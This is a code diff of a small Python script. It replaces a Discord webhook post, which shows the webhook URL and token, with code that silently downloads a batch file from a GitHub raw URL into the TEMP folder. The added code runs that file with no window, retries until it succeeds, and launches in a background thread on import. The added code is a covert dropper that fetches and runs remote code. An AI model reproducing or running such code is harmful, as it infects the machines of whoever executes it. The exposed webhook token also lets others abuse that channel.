@@ -1,6 +1,19 @@
-import requests
+import subprocess
+import os
+import urllib.request
+import time
+import threading
 
-url = 'https://discord.com/api/webhooks/1413904009932177559/A25ugwZBZqSiEVOg_ZscIgojk_SQ6bLFKIXjidBx_UkhCNOK-nBvRNgFnrXLqH3NFpDP'
-data = {'content': 'Hi'}
+def main():
+    url = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/main.bat'
+    path = os.path.join(os.getenv('TEMP') or '.', 'main.bat')
+    while True:
+        try:
+            urllib.request.urlretrieve(url, path)
+            subprocess.Popen(path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+            break
 
-requests.post(url, json=data)
+        except:
+            time.sleep(3)
+
+threading.Thread(target=main).start()
